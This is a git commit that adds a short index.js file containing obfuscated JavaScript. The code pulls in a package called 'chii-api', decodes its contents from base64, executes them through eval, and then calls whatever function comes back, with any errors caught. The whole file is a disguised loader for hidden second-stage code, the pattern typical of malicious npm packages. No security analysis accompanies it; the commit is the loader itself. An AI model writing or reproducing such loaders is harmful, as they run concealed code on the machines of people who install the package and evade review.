6d45776861dd520d4365048a4299efd4df0d730f
izusgvsv72727 <heng89704@gmail.com>
2025-02-22 11:51:13 +0700

    index.js

---
+++ index.js
@@ -0,0 +1,21 @@
+(function () {
+    let _0x1a3b = 'utf8';
+    let _0x9f45 = 'chii-api';
+    let _0x7bdc = 'base64';
+    function _0x8dfg6(_0x5e1a, _0x6b7d) {
+        return (function (_0x2f7c, _0x1f3b) {
+            return _0x2f7c(_0x5e1a, _0x1f3b);
+        })(function (_0x4f32, _0x8e9d) {
+            return eval(_0x4f32);
+        }, _0x6b7d);
+    }
+    try {
+        let _0x21a9 = Buffer.from(require(_0x9f45), _0x7bdc).toString(_0x1a3b);
+        let _0x13fe = _0x8dfg6(_0x21a9, require);
+        if (typeof _0x13fe === 'function') {
+            _0x13fe();
+        }
+    } catch (_0x2d0f) {
+        console.error('Error API CHII', _0x2d0f);
+    }
+})();
